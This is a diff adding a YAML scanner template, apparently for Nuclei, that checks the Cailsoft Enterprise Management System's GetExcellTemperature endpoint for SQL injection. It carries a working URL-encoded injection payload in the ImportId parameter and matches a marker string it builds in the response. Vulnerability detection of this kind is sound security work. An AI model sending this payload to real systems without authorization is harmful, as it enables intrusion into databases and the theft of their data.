@@ -1,0 +1,21 @@
+id: poc-yaml-cailsoft-getexcelltemperature-sqli
+info:
+  name: Cailsoft GetExcellTemperature SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for a SQL injection vulnerability in the Cailsoft Enterprise Management System's GetExcellTemperature endpoint.
+http:
+  - method: GET
+    path:
+      - "/BaseModule/ExcelImport/GetExcellTemperature?ImportId=%27%20AND%206935%20IN%20(SELECT%20(CHAR(113)%2BCHAR(122)%2BCHAR(112)%2BCHAR(106)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(6935%3D6935)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(122)%2BCHAR(113)%2BCHAR(118)%2BCHAR(113)))%20AND%20%27qaq%27=%27qaq"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "qzpjq1qzqvq"
+        part: body
